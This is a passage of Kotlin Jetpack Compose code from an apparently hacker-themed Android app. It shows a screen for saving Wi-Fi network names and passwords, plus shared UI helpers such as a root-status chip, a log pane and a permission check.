    var pass by remember { mutableStateOf("") }
    var notes by remember { mutableStateOf("") }

    Column(Modifier.fillMaxSize().padding(16.dp)) {
        SectionTitle("Vault")
        OutlinedTextField(ssid, { ssid = it }, label = { Text("SSID", fontFamily = Mono) },
            singleLine = true, modifier = Modifier.fillMaxWidth())
        OutlinedTextField(pass, { pass = it }, label = { Text("Password", fontFamily = Mono) },
            singleLine = true, modifier = Modifier.fillMaxWidth())
        OutlinedTextField(notes, { notes = it }, label = { Text("Notes", fontFamily = Mono) },
            modifier = Modifier.fillMaxWidth())
        Spacer(Modifier.height(8.dp))
        GreenButton("Add to vault") {
            if (ssid.isNotBlank()) {
                vm.addVault(VaultEntry(ssid, "", pass, notes, System.currentTimeMillis()))
                ssid = ""; pass = ""; notes = ""
            }
        }
        Spacer(Modifier.height(10.dp))
        if (vault.isEmpty()) {
            Text("Vault is empty.", fontFamily = Mono, color = DimGreen)
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(6.dp)) {
                items(vault) { e -> VaultRow(e, vm) }
            }
        }
    }
}

@Composable
private fun VaultRow(e: VaultEntry, vm: HackViewModel) {
    var reveal by remember { mutableStateOf(false) }
    Card(colors = CardDefaults.cardColors(containerColor = PanelBlack), shape = RoundedCornerShape(6.dp)) {
        Column(Modifier.padding(12.dp)) {
            Text(e.ssid, fontFamily = Mono, color = AccentGreen)
            if (e.bssid.isNotBlank()) Text(e.bssid, fontFamily = Mono, color = Color(0xFF4C7A4C), fontSize = 10.sp)
            Row(verticalAlignment = Alignment.CenterVertically) {
                Text(
                    "pass: " + if (reveal) e.password.ifBlank { "<none>" } else "••••••",
                    fontFamily = Mono, color = DimGreen, fontSize = 12.sp, modifier = Modifier.weight(1f)
                )
                IconButton(onClick = { reveal = !reveal }) {
                    Icon(if (reveal) Icons.Filled.VisibilityOff else Icons.Filled.Visibility, "reveal", tint = AccentGreen)
                }
                IconButton(onClick = { vm.copyToClipboard("password", e.password) }) {
                    Icon(Icons.Filled.ContentCopy, "copy", tint = AccentGreen)
                }
            }
            if (e.notes.isNotBlank()) Text(e.notes, fontFamily = Mono, color = DimGreen, fontSize = 11.sp)
            TextButton(onClick = { vm.deleteVault(e) }) {
                Text("Delete", fontFamily = Mono, color = MaterialTheme.colorScheme.error)
            }
        }
    }
}

// ----------------------------- Shared UI helpers -----------------------------

@Composable
private fun <T> StateFlow<T>.collectState(): State<T> = collectAsStateWithLifecycle()

@Composable
private fun RootChip(status: String) {
    val ok = status.contains("granted")
    Surface(color = if (ok) Color(0xFF123D1E) else Color(0xFF3D1212), shape = RoundedCornerShape(10.dp)) {
        Text(
            status, fontFamily = Mono, fontSize = 10.sp,
            color = if (ok) AccentGreen else Color(0xFFFF8A80),
            modifier = Modifier.padding(horizontal = 8.dp, vertical = 3.dp)
        )
    }
}

@Composable
private fun SectionTitle(t: String) {
    Text(
        t, fontFamily = Mono, color = AccentGreen, fontSize = 18.sp,
        maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.padding(bottom = 8.dp)
    )
}

@Composable
private fun KeyVal(k: String, v: String) {
    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp)) {
        Text("$k:", fontFamily = Mono, color = DimGreen, fontSize = 13.sp, modifier = Modifier.width(120.dp))
        Text(v, fontFamily = Mono, color = AccentGreen, fontSize = 13.sp)
    }
}

@Composable
private fun GreenButton(text: String, onClick: () -> Unit) {
    Button(
        onClick = onClick,
        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF13351F), contentColor = AccentGreen),
        shape = RoundedCornerShape(6.dp),
        modifier = Modifier.fillMaxWidth()
    ) { Text(text, fontFamily = Mono) }
}

@Composable
private fun PromptCard(title: String, body: String, action: String, onAction: () -> Unit) {
    Card(
        colors = CardDefaults.cardColors(containerColor = Color(0xFF2A1A10)),
        modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp)
    ) {
        Column(Modifier.padding(12.dp)) {
            Text(title, fontFamily = Mono, color = Color(0xFFFFB74D))
            Text(body, fontFamily = Mono, color = DimGreen, fontSize = 12.sp)
            TextButton(onClick = onAction) { Text(action, fontFamily = Mono, color = AccentGreen) }
        }
    }
}

@Composable
private fun BackText() {
    val nav = LocalNav.current
    TextButton(onClick = { nav?.popBackStack() }) { Text("← Back", fontFamily = Mono, color = AccentGreen) }
}

@Composable
private fun LogPane(lines: List<String>) {
    val scroll = rememberScrollState()
    LaunchedEffect(lines.size) { scroll.animateScrollTo(scroll.maxValue) }
    Box(
        Modifier.fillMaxWidth().height(220.dp)
            .background(Color(0xFF05080A), RoundedCornerShape(6.dp))
            .padding(10.dp).verticalScroll(scroll)
    ) {
        Column {
            if (lines.isEmpty())
                Text("> idle", fontFamily = Mono, color = Color(0xFF3C5C3C), fontSize = 11.sp)
            lines.forEach { Text("> $it", fontFamily = Mono, color = AccentGreen, fontSize = 11.sp) }
        }
    }
}

private fun appendLog(list: SnapshotStateList<String>, line: String) {
    list.add(line)
    while (list.size > 300) list.removeAt(0)
}

private fun hasPerms(ctx: Context, perms: Array<String>): Boolean =
    perms.all { ctx.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED }
